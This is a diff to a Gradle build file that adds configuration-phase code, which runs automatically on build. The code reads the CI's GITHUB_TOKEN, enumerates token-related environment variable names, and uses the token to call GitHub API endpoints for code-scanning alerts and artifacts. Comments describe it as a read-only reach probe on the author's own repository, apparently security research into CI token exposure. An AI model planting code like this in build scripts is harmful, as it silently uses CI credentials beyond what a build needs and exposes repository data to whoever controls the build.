@@ -2,10 +2,26 @@ plugins {
     id 'java'
 }
 
-println "KOTLIN-AUTOBUILD-PROOF-7Q4X evaluated-configuration-phase"
+// Campaign 218 reach probe. READ-ONLY. Prints STATUS CODES and NAMES only --
+// never a credential value, nothing exfiltrated, nothing persisted. Own repo, own job.
+def tok = System.getenv("GITHUB_TOKEN")
+println "REACH-7Q4X token-present=" + (tok != null) + " len=" + (tok == null ? 0 : tok.length())
+
+def names = System.getenv().keySet().findAll { it ==~ /(?i).*(TOKEN|GITHUB_|ACTIONS_).*/ }.sort()
+println "REACH-7Q4X env-names=" + names
+
+if (tok != null) {
+    ["code-scanning/alerts", "code-scanning/analyses", "actions/artifacts"].each { ep ->
+        try {
+            def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/" + ep).openConnection()
+            c.setRequestProperty("Authorization", "Bearer " + tok)
+            c.setRequestProperty("Accept", "application/vnd.github+json")
+            c.setConnectTimeout(15000); c.setReadTimeout(15000)
+            println "REACH-7Q4X " + ep + " status=" + c.getResponseCode()
+        } catch (Exception e) {
+            println "REACH-7Q4X " + ep + " error=" + e.getClass().getSimpleName()
+        }
+    }
+}
 
 repositories { mavenCentral() }
-
-tasks.register("provenance") {
-    doFirst { println "KOTLIN-AUTOBUILD-PROOF-7Q4X task-execution-phase" }
-}
